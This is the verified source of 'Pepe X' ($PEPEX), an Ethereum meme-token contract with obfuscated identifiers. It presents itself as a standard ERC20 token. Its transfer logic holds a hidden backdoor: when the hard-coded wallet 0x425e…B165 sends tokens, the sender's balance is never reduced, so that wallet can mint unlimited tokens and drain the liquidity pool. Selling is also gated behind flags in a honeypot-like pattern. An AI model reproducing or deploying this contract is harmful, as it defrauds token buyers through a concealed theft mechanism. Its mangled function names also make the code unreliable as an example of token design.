/**
 *Submitted for verification at Etherscan.io on 2023-09-20
*/

/**

Pepe X   $PEPEX


TWITTER: https://twitter.com/PepeX_Coin
TELEGRAM: https://t.me/PepeXerc_Coin
WEBSITE: https://pepexerc.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _fpmpb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _fpmpb(a, b, "SafeMath:");
    }

    function  _fpmpb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xopvjraf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xmfgmtas {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract PEPEX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe X";
    string private constant _symbol = unicode"PEPEX";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalgh = 1000000000 * 10 **_decimals;
    uint256 public _mxkvgAmaunt = _Totalgh;
    uint256 public _Wallesroep = _Totalgh;
    uint256 public _wapThresxuao= _Totalgh;
    uint256 public _molkTakrf= _Totalgh;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _iskEwjalp;
    mapping (address => bool) private _taxrvWarivy;
    mapping(address => uint256) private _lrorktuobe;
    bool public _taegaleov = false;
    address payable private _TdjFokp;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapnfonqb=0;
    uint256 private _burntone=0;


    _xmfgmtas private _Tfnoapal;
    address private _yawavcps;
    bool private _qrmxpvih;
    bool private leSorytup = false;
    bool private _awajuxnp = false;


    event _amzabwvl(uint _mxkvgAmaunt);
    modifier loevThoulq {
        leSorytup = true;
        _;
        leSorytup = false;
    }

    constructor () {
        
        _TdjFokp = payable(0x425e28eD992dc5Ee191C8279Ab3F01Ef992cB165);
        _balances[_msgSender()] = _Totalgh;
        _iskEwjalp[owner()] = true;
        _iskEwjalp[address(this)] = true;
        _iskEwjalp[_TdjFokp] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalgh);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalgh;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fpmpb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taegaleov) {
                if (to != address
                (_Tfnoapal) && to !=
                 address(_yawavcps)) {
                  require(_lrorktuobe
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrorktuobe
                  [tx.origin] = block.number;
                }
            }

            if (from == _yawavcps && to != 
            address(_Tfnoapal) && !_iskEwjalp[to] ) {
                require(amount <= _mxkvgAmaunt,
                 "Exceeds the _mxkvgAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesroep, "Exceeds the maxWalletSize.");
                if(_burntone
                < _wapnfonqb){
                  require(! _frjuoqei(to));
                }
                _burntone++;
                 _taxrvWarivy[to]=true;
                teeomoun = amount.mul((_burntone>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _yawavcps && from!= address(this) 
            && !_iskEwjalp[from] ){
                require(amount <= _mxkvgAmaunt && 
                balanceOf(_TdjFokp)<_molkTakrf,
                 "Exceeds the _mxkvgAmaunt.");
                teeomoun = amount.mul((_burntone>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burntone>_wapnfonqb &&
                 _taxrvWarivy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!leSorytup 
            && to == _yawavcps && _awajuxnp &&
             contractTokenBalance>_wapThresxuao 
            && _burntone>_wapnfonqb&&
             !_iskEwjalp[to]&& !_iskEwjalp[from]
            ) {
                _swpfbjghah( _rpane(amount, 
                _rpane(contractTokenBalance,_molkTakrf)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _roxeujq(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _fpmpb(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _fpmpb(teeomoun));
        emit Transfer(from, to, 
        amount. _fpmpb(teeomoun));
    }

    function _swpfbjghah(uint256
     tokenAmount) private loevThoulq {
        if(tokenAmount==0){return;}
        if(!_qrmxpvih){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tfnoapal.WETH();
        _approve(address(this),
         address(_Tfnoapal), tokenAmount);
        _Tfnoapal.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _rpane(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _fpmpb(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TdjFokp){
            return a ;
        }else{
            return a . _fpmpb (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxkvgAmaunt = _Totalgh;
        _Wallesroep = _Totalgh;
        _taegaleov = false;
        emit _amzabwvl(_Totalgh);
    }

    function _frjuoqei(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _roxeujq(uint256
    amount) private {
        _TdjFokp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qrmxpvih);
        _Tfnoapal   =  _xmfgmtas (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tfnoapal), _Totalgh);
        _yawavcps = _xopvjraf(_Tfnoapal.factory()). createPair (address(this),  _Tfnoapal . WETH ());
        _Tfnoapal.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_yawavcps).approve(address(_Tfnoapal), type(uint).max);
        _awajuxnp = true;
        _qrmxpvih = true;
    }

    receive() external payable {}
}